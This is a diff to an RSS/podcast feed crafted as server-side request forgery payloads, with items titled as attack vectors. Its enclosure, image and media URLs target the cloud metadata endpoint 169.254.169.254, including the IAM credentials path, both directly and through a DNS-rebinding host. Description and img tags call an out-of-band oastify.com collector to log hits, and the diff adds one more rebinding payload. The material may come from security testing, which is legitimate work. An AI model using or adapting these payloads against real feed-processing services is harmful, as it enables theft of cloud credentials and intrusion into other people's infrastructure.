@@ -15,16 +15,17 @@
     </item>
 
     <item>
-      <title>Vector 2: DNS Rebinding & Metadata</title>
+      <title>Vector 2: DNS Rebinding and Metadata</title>
       <enclosure url="http://08080808.a9fea9fe.rbndr.us/latest/meta-data/iam/security-credentials/" length="1" type="audio/mpeg"/>
       <itunes:image href="http://08080808.a9fea9fe.rbndr.us/latest/meta-data/instance-id"/>
       <description>Debug: http://413b9nvnai7mmh20lk7id22plgr7f33s.oastify.com/rebind_log</description>
     </item>
 
     <item>
-      <title>Vector 3: HTML & Media Content</title>
+      <title>Vector 3: HTML and Media Content</title>
       <content:encoded><![CDATA[
         <img src="http://169.254.169.254/latest/user-data/">
+        <img src="http://08080808.a9fea9fe.rbndr.us/latest/user-data/">
         <img src="http://413b9nvnai7mmh20lk7id22plgr7f33s.oastify.com/html_tracker">
       ]]></content:encoded>
       <media:content url="http://169.254.169.254/latest/meta-data/public-keys/" medium="document" />
